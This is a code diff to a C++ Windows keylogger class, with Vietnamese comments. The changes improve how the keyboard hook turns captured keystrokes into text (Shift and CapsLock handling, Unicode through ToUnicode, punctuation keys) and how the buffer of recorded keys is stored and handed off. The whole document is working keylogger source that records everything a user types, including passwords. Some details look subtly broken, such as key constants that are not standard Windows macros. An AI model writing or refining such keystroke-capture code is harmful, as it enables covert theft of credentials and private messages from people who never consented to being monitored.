@@ -14,8 +14,11 @@ Keylogger::~Keylogger() {
 
 // --- PHẦN 1: Logic xử lý chuỗi ---
 void Keylogger::append(const std::string& str) {
-    // Thread-safe buffer access
-    std::lock_guard<std::mutex> lock(_mtx); 
+    // Thread-safe buffer access - tối ưu: reserve trước để tránh reallocation
+    std::lock_guard<std::mutex> lock(_mtx);
+    if (_buffer.capacity() < _buffer.size() + 10) {
+        _buffer.reserve(_buffer.size() * 2 + 256); // Double capacity khi cần
+    }
     _buffer.push_back(str);
 }
 
@@ -62,18 +65,110 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         else if (key == VK_F14) append("[F14]");
         else if (key == VK_F15) append("[F15]");
         else if (key == VK_NUMLOCK) append("[NUMLOCK]");
-        else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
-             append(std::string(1, (char)key));
-        }
-        else {
+        else if ((key >= VK_0 && key <= VK_9) || (key >= VK_A && key <= VK_Z)) {
+             // Xử lý phím số và chữ - cần kiểm tra Shift để có ký tự đặc biệt
              BYTE keyState[256];
-             WORD translated[2];
              if (GetKeyboardState(keyState)) {
-                 int result = ToAscii(key, 0, keyState, translated, 0);
-                 if (result == 1 && translated[0] >= 32 && translated[0] <= 126) {
-                     append(std::string(1, (char)translated[0]));
+                 bool isShift = (keyState[VK_SHIFT] & 0x80) != 0;
+                 bool isCapsLock = (keyState[VK_CAPITAL] & 0x01) != 0;
+                 
+                 if (key >= VK_A && key <= VK_Z) {
+                     // Chữ cái - xử lý Shift và CapsLock
+                     char c = (char)('A' + (key - VK_A));
+                     if ((isShift && !isCapsLock) || (!isShift && isCapsLock)) {
+                         append(std::string(1, c)); // Uppercase
+                     } else {
+                         append(std::string(1, c + 32)); // Lowercase
+                     }
+                 } else if (key >= VK_0 && key <= VK_9) {
+                     // Số - xử lý Shift để có ký tự đặc biệt
+                     char numChars[] = "0123456789";
+                     char specialChars[] = ")!@#$%^&*(";
+                     int index = key - VK_0;
+                     if (isShift && index < 10) {
+                         append(std::string(1, specialChars[index]));
+                     } else {
+                         append(std::string(1, numChars[index]));
+                     }
+                 }
+             } else {
+                 // Fallback: dùng ToUnicode trực tiếp
+                 WCHAR unicodeChars[4] = {0};
+                 BYTE fallbackKeyState[256] = {0};
+                 if (GetKeyboardState(fallbackKeyState)) {
+                     int result = ToUnicode(key, 0, fallbackKeyState, unicodeChars, 4, 0);
+                     if (result > 0) {
+                         std::wstring wstr(unicodeChars, result);
+                         int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
+                         if (size_needed > 0) {
+                             std::string utf8Str(size_needed, 0);
+                             WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
+                             append(utf8Str);
+                         } else {
+                             append("[" + std::to_string(key) + "]");
+                         }
+                     } else {
+                         append("[" + std::to_string(key) + "]");
+                     }
                  } else {
                      append("[" + std::to_string(key) + "]");
+                 }
+             }
+        }
+        else {
+             // Dùng ToUnicode() thay vì ToAscii() để xử lý Unicode và phím đặc biệt tốt hơn
+             BYTE keyState[256];
+             WCHAR unicodeChars[4] = {0};
+             
+             if (GetKeyboardState(keyState)) {
+                 // ToUnicode() xử lý tốt hơn Unicode, dead keys, và các ký tự đặc biệt
+                 int result = ToUnicode(key, 0, keyState, unicodeChars, 4, 0);
+                 
+                 if (result > 0) {
+                     // Có ký tự Unicode hợp lệ
+                     std::wstring wstr(unicodeChars, result);
+                     
+                     // Convert Unicode to UTF-8
+                     int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
+                     if (size_needed > 0) {
+                         std::string utf8Str(size_needed, 0);
+                         WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
+                         append(utf8Str);
+                     } else {
+                         // Fallback: thử ToAscii cho ASCII
+                         WORD translated[2] = {0};
+                         int asciiResult = ToAscii(key, 0, keyState, translated, 0);
+                         if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
+                             append(std::string(1, (char)translated[0]));
+                         } else {
+                             append("[" + std::to_string(key) + "]");
+                         }
+                     }
+                 } else if (result == -1) {
+                     // Dead key - bỏ qua, sẽ được xử lý ở lần nhấn tiếp theo
+                 } else {
+                     // Không có ký tự - thử ToAscii
+                     WORD translated[2] = {0};
+                     int asciiResult = ToAscii(key, 0, keyState, translated, 0);
+                     if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
+                         append(std::string(1, (char)translated[0]));
+                     } else {
+                         // Xử lý các phím đặc biệt khác
+                         if (key == VK_OEM_1) append(";");      // ;:
+                         else if (key == VK_OEM_PLUS) append("="); // =+
+                         else if (key == VK_OEM_COMMA) append(","); // ,<
+                         else if (key == VK_OEM_MINUS) append("-"); // -_
+                         else if (key == VK_OEM_PERIOD) append("."); // .>
+                         else if (key == VK_OEM_2) append("/");  // /?
+                         else if (key == VK_OEM_3) append("`"); // `~
+                         else if (key == VK_OEM_4) append("[");  // [{
+                         else if (key == VK_OEM_5) append("\\"); // \|
+                         else if (key == VK_OEM_6) append("]");  // ]}
+                         else if (key == VK_OEM_7) append("'"); // '"
+                         else {
+                             append("[" + std::to_string(key) + "]");
+                         }
+                     }
                  }
              } else {
                  append("[" + std::to_string(key) + "]");
@@ -126,11 +221,15 @@ void Keylogger::Stop() {
 vector<std::string> Keylogger::getDataAndClear() {
     std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
     
-    if (_buffer.empty()) return {};
+    if (_buffer.empty()) {
+        return {};
+    }
     
-    vector<std::string> dataCopy = _buffer; // Copy dữ liệu ra
-    _buffer.clear();                // Xóa dữ liệu gốc đi
+    // Dùng move semantics thay vì copy - nhanh hơn nhiều
+    vector<std::string> result = std::move(_buffer);
+    _buffer.clear();
+    _buffer.reserve(256); // Reserve lại để tránh reallocation cho lần sau
     
-    return dataCopy; // Trả về bản copy
+    return result; // Trả về bằng move
 } // Tự động mở khóa
 #endif
